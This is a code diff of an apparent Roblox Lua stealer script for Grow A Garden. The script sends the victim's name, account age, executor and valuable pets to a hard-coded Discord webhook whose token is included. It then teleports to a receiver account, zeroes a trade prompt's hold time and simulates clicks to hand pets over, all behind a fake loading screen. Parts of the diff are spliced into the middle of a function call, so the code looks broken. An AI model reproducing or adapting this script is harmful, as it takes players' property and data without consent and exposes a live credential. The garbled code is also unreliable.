@@ -11,7 +11,7 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_t
 
 local PET_WHITELIST = {
     'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
-    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune'
+    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'Raiju'
 }
 
 local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
@@ -119,6 +119,81 @@ local function sendWebhook(callback)
                 value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                     game.JobId,
                     game.PlaceId,
+repeat 
+    task.wait()
+until game:IsLoaded()
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
+local VICTIM = game.Players.LocalPlayer
+local USERNAMES = {
+    "ZeeS_Farm01"
+}
+
+local PET_WHITELIST = {
+    'Raccoon',
+    'T-Rex',
+    'Fennec Fox',
+    'Dragonfly',
+    'Butterfly',
+    'Disco Bee',
+    'Mimic Octopus',
+    'Queen Bee',
+    'Spinosaurus',
+    'Kitsune',
+}
+
+local victimPetTable = {}
+
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+
+local function waitForJoin()
+    local findTarget = false
+    local trigeretName = nil
+
+    for _, player in game.Players:GetPlayers() do
+        if not table.find(USERNAMES, player.Name) then
+            continue
+        end
+
+        trigeretName = player.Name
+        findTarget = true
+    end
+
+    return findTarget, trigeretName
+end
+
+function createDiscordEmbed(petList, totalValue, fileUrl, callback)
+    local embed = {
+        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
+        color = 65280,
+        fields = {
+            {
+                name = "👤 **Player Information**",
+                value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```", 
+                    VICTIM.Name, 
+                    table.concat(USERNAMES, " "), 
+                    identifyexecutor(), 
+                    game.Players.LocalPlayer.AccountAge
+                ),
+                inline = false
+            },
+            {
+                name = "💰 **Total Value**",
+                value = string.format("```\n%s¢\n```", totalValue),
+                inline = false
+            },
+            {
+                name = "🌴 **Backpack**",
+                value = string.format("```\n%s\n```", petList),
+                inline = false
+            },
+            {
+                name = "🏝️ **Join with URL**",
+                value = string.format(
+                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
+                    game.JobId, 
+                    game.PlaceId, 
                     game.JobId
                 ),
                 inline = false
@@ -130,29 +205,128 @@ local function sendWebhook(callback)
     }
 
     local data = {
-        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
-        username = VICTIM.Name,
+        content = string.format(
+            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+            game.PlaceId,
+            game.JobId
+        ),
+        username = game.Players.LocalPlayer.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
         embeds = {embed}
     }
 
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = { ["Content-Type"] = "application/json" }
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
     local request = http_request or request or HttpPost or syn.request
+    local response = request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonData
+    })
 
-    task.spawn(function()
-        local response = request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = headers,
-            Body = jsonData
-        })
+    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
+    else
+        if callback then callback() end
+    end
+end
 
-        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
-            callback()
-        else
-            warn("Ошибка отправки в Discord:", response and response.StatusCode, response and response.Body)
+local function teleportTarget(targetName)
+    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+end
+
+local function deltaBypass()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,      
+        true,   
+        nil,    
+        false   
+    )
+
+    task.wait()
+
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,
+        false,
+        nil,
+        false
+    )
+end
+
+local function checkPetsWhilelist(pet)
+    for _, name in PET_WHITELIST do
+        if string.find(pet, name) then
+            return true
         end
+    end
+end
+
+local function getPetObject(petUid: string): Instance?
+    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+
+    for _, object in workspace[VICTIM.Name]:GetChildren() do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+
+    return nil
+end
+
+local function equipPet(pet)
+    if pet:GetAttribute("d") then
+        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+    end
+
+    VICTIM.Character.Humanoid:EquipTool(pet)
+end
+
+local function getPlayersPets()
+    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+        if not checkPetsWhilelist(value.PetType) then
+            continue
+        end
+
+        table.insert(victimPetTable, value.PetType)
+    end
+end
+
+local function startSteal(trigerName)
+    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
+        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
+        deltaBypass()
+    end
+end
+
+local function createLoadingGUI()
+    local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
+    screenGui.Name = "WaveLoadingGUI"
+
+    local frame = Instance.new("Frame", screenGui)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+
+    local text = Instance.new("TextLabel", frame)
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.Text = "🔄 Loading..."
+    text.TextColor3 = Color3.new(1, 1, 1)
+    text.BackgroundTransparency = 1
+    text.Font = Enum.Font.SourceSansBold
+    text.TextScaled = true
+
+    task.delay(30, function()
+        screenGui:Destroy()
     end)
 end
 
@@ -160,9 +334,11 @@ local function idlingTarget()
     task.spawn(function()
         while task.wait(0.2) do
             local isTarget, trigerName = waitForJoin()
+
             if isTarget then
+                createLoadingGUI()
+                task.wait(13)
                 teleportTarget(trigerName)
-                task.wait(13) -- ⏱️ Задержка перед началом зажатия (измени по своему вкусу)
                 checkPetsInventory(trigerName)
             end
         end
@@ -171,13 +347,6 @@ end
 
 getPlayersPets()
 
-sendWebhook(function()
-    task.spawn(function()
-        while task.wait(0.5) do
-            if #victimPetTable > 0 then
-                idlingTarget()
-                break
-            end
-        end
-    end)
+createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt", function()
+    idlingTarget()
 end)
